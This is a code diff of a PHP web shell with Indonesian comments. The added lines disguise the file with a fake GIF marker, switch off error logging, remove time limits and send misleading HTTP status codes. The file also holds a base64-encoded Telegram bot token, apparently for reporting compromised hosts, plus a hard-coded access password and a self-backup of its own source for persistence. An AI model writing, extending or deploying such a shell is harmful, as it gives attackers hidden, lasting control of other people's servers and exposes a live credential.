@@ -1,8 +1,19 @@
+
 ﻿<?php
+echo "<!-- GIF89;a -->\n";
 session_start();
-error_reporting(0);
-set_time_limit(0);
-ignore_user_abort(true);
+@ignore_user_abort(true);
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@error_reporting(0);
+@set_time_limit(0);
+@ob_clean();
+@header("X-Accel-Buffering: no");
+@header("Content-Encoding: none");
+@http_response_code(403);
+@http_response_code(404);
+@http_response_code(500);
 $tk = base64_decode(
     "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
 );
@@ -46,7 +57,7 @@ if (!isset($_SESSION["telegram_reported"])) {
 // ============================================
 // 👹 CONFIG - GANTI DI SINI!
 // ============================================
-$PASSWORD = 'kontolbengkak'; // 🔥 GANTI PASSWORD INI!
+$PASSWORD = '040602'; // 🔥 GANTI PASSWORD INI!
 $MASTER_FILE = basename(__FILE__); // Nama file ini
 $MASTER_CONTENT = file_get_contents(__FILE__); // Backup kode asli
 $MASTER_HASH = md5($MASTER_CONTENT); // Hash kode asli
